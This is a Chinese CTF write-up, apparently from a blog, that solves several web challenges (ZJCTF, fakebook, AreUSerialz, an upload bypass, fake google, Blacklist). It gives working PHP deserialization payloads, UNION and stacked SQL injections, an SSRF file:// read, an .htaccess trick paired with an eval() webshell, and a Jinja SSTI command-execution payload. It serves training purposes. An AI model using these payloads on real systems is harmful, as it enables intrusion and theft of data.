<p>首先提交text变量，使用data://协议，可以进行输入（此处不能用php://input，猜测是关了那个按钮）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<p>源码提示设置file变量未useless.php，猜测需要读取useless.php源码，使用php://filter/read=convert.base64-encode/resource</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>base64解码后得到下面这段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结合主页面显示的源码，这是一个php反序列化问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$flag &#x3D; new Flag();</span><br><span class="line">$flag-&gt;file &#x3D; &quot;flag.php&quot;;</span><br><span class="line">echo serialize($flag);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure>
<p>查看源码，得到flag</p>
<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>来源：网鼎杯2018</p>
<p>考察：sql注入，ssrf</p>
<p>查看robots.txt，提示访问user.php.bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个页面表示blog的内容会回显到页面上，之后ssrf用得到</p>
<p>首先进行正常的登录和注册，未发现sql注入点</p>
<p>登录点进某个用户的页面，发现URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>此处进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1</span><br><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4#</span><br><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;%27fakebook%27#</span><br><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;%27user%27#</span><br><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;%27users%27#</span><br><span class="line">view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(data),3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;users#</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125;,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;2&quot;;s:3:&quot;age&quot;;i:2;s:4:&quot;blog&quot;;s:5:&quot;2.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
<p>此处进行ssrf注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;#</span><br></pre></td></tr></table></figure>
<p>可以读取出flag.php的base64编码（在源码中才可以看到）</p>
<p>解码后得到flag</p>
<h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><p>来源：网鼎杯2020</p>
<p>考察：php反序列化</p>
<p>进入页面，源代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123; <span class="comment">// 这里可以猜测为反序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>; <span class="comment">// protected变量只能在初始化或者内部函数访问时赋值</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 创建对象时执行</span></span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>; <span class="comment">//注意此处op变量的值未赋给$this-&gt;op</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read(); <span class="comment">// 这个很关键，说明op的值要为2</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content); <span class="comment">// 读取文件，将文件内容放到content中</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 读取文件内容</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="comment">//销毁时自动执行</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>) <span class="comment">// 此处为===，要绕过，故提交的op为数字2</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123; <span class="comment">// 以get方式提交str</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pretected和private变量在序列化后，引入不可见字符\x00，对应ascii码为0，无法通过is_valid函数。（private引入\x00，protected引入\x00*\x00）</p>
<p>绕过1：打印序列化字符串时，将s改写成S，之后的字符串可以用16进制表示</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-56352.html">https://www.t00ls.net/articles-56352.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">    protected $op&#x3D;2;</span><br><span class="line">    protected $filename&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; echo urlencode(serialize(new FileHandler));</span><br><span class="line"></span><br><span class="line">$a &#x3D; serialize(new FileHandler);</span><br><span class="line">&#x2F;&#x2F; echo $a;</span><br><span class="line">$a &#x3D; str_replace(chr(0),&#39;\00&#39;,$a);</span><br><span class="line">$a &#x3D; str_replace(&#39;s:&#39;,&#39;S:&#39;,$a);</span><br><span class="line">echo urlencode($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>绕过2：php&gt;7.1版本中对类属性的检测不严格，可以直接使用public属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$f &#x3D; new FileHandler();</span><br><span class="line">$f-&gt;op&#x3D;2;</span><br><span class="line">$f-&gt;filename&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;;</span><br><span class="line">echo serialize($f);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>之后通过 /proc/self/cmdline 知道配置文件路径 /web/config/httpd.conf,通过配置文件知道目录的路径/web/html</p>
<p>最后的payload（这里直接猜在当前目录下，没走上面的流程）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$f &#x3D; new FileHandler();</span><br><span class="line">$f-&gt;op&#x3D;2;</span><br><span class="line">$f-&gt;filename&#x3D;&quot;flag.php&quot;;</span><br><span class="line">echo serialize($f);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在源码中得到flag</p>
<h1 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h1><p>来源：MRCTF2020</p>
<p>考察：.htaccess绕过</p>
<p>对后缀进行了绕过，只能上传png</p>
<p>上传.htaccess绕过</p>
<p>.htaccess写法1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application&#x2F;x-httpd-php    .png</span><br></pre></td></tr></table></figure>
<p>.htaccess写法2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;&#x2F;&#x2F;注意要指定你上传的文件名和此文件名相同，这样它才能被当作php文件解析</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>1.png</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>之后蚁剑连接即可，在根目录下看到flag</p>
<h1 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h1><p>来源：BJDCTF2nd</p>
<p>考察：SSTI</p>
<p>进入页面后，随便输入一个字符，跳转到下一个页面。查看源码，提示为ssti。</p>
<p>不会ssti（不想数数），抄题解 <a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/107237455">https://blog.csdn.net/tm_1024/article/details/107237455</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__() ---查看可用模块</span><br><span class="line"></span><br><span class="line">().__class__.base__.__subclasses__().index(warnings.catch_warnings)可以查看当前位置，不过题目环境不能用。手动数吧&#x3D; &#x3D; 169位</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;发现可以执行，构造命令</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;没有什么过滤&#x3D; &#x3D;友好!</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>来源：GYCTF2020</p>
<p>考察：sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p>返回1</p>
<p>而1和2的值是不一样的，猜测可以布尔盲注。失败</p>
<p>HANDLER可以替代select</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables;#</span><br></pre></td></tr></table></figure>
<p>得到表名 FlagHere</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;HANDLER FlagHere open;HANDLER FlagHere read first;Handler FlagHere close;#</span><br></pre></td></tr></table></figure>
<p>得到flag（最后一个 close不是必须）</p>
<h2 id="HANDLER"><a href="#HANDLER" class="headerlink" title="HANDLER"></a>HANDLER</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias] &#x2F;&#x2F; 打开表</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) &#x2F;&#x2F; 读取表的指定列</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; &#x2F;&#x2F; 读取指定表指定列的第一个值|下一个值|前一个值|最后一个值</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; &#x2F;&#x2F; 读取指定表的第一个值|下一个值</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE &#x2F;&#x2F; 关闭表</span><br><span class="line">&#x2F;&#x2F;其中  HANDLER tbl_name OPEN AS example</span><br><span class="line">&#x2F;&#x2F;其后  HANDLER example READ index_name&#x3D;&quot;example2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 